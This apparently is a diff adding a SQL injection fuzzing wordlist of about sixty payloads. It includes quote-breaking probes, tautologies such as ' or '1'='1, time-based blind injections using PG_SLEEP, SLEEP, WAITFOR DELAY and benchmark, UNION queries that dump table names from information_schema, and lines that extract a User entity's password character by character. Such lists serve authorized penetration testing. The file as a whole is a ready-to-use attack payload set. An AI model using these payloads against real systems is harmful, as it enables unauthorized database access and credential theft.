@@ -1,0 +1,61 @@
+'
+''
+'|'
+'||'
+1' 
+1" 
+[1] 
+[]=1 
+1` 
+1\ 
+1/*'*/ 
+1/*!1111'*/ 
+1'||'asd'||'   &lt;== concat string 
+1' or '1'='1 
+1 or 1=1 
+'or''='
+')) OR 81=(SELECT 81 FROM PG_SLEEP(15))--
+') OR 556=(SELECT 556 FROM PG_SLEEP(15))--
+' OR 888=(SELECT 888 FROM PG_SLEEP(15))--
+(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select( sleep(15)))v)+"*/
+0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+if(now()=sysdate(),sleep(15),0)
+')) OR 709=(SELECT 709 FROM PG_SLEEP(15))--
+')) OR 877=(SELECT 877 FROM PG_SLEEP(15))-
+') OR 287=(SELECT 287 FROM PG_SLEEP(15))--
+' OR 51=(SELECT 51 FROM PG_SLEEP(15))--
+') OR 973=(SELECT 973 FROM PG_SLEEP(15))--
+')) OR 500=(SELECT 500 FROM PG_SLEEP(15))--
+-1)) OR 312=(SELECT 312 FROM PG_SLEEP(15))--
+1'UNION SELECT MD5(31337) --
+'+or+'PZdpU'='PZdpU
+-1+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables
+(select(0)from(select(sleep(25)))v)
+followers+or+sleep(0.000000001)
+{"param":"1')))+MySQL_payload--+-"}
+1 or 1=(select 1 from App\Entity\User a where a.id=1 and substring(a.password,1,1)='$')
+1 or 1=(select 1 from App\Entity\User a where a.id=1 and substring(a.password,1,1)='v')
+51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
+0'XOR(if(1,sleep(15),0))XOR'
+'if(now()=sysdate(),sleep(12),0)
+'; WAITFOR DELAY '0:0:15'--
+"; WAITFOR DELAY '0:0:15'--
+1-sleep(15)
+1-sleep/*f*/(15)
+5,sleep/*f*/(15),0)
+(SELECT * FROM (SELECT(SLEEP(15)))a)
+'(SELECT * FROM (SELECT(SLEEP(15)))a)
+"(SELECT * FROM (SELECT(SLEEP(15)))a)
+'-if(1=2,'0','1')-'
+'-if(1=1,'0','1')-'
+10+INTO+@A
+1%3dbenchmark(40000000,sha(1))+and+1
+1' AND (SELECT 6268 FROM (SELECT(SLEEP(15)))ghXo) AND 'IKlK'='IKlK
+1'=sleep(10)='1 
+'=IF(MID(VERSION(),1,1)=1,SLEEP(10),0)='1
+'=IF(MID(VERSION(),1,1)=5,SLEEP(10),0)='1
+1 ' or true# 
+1 ' or false#
+')))+MySQL_payload--+-
+@
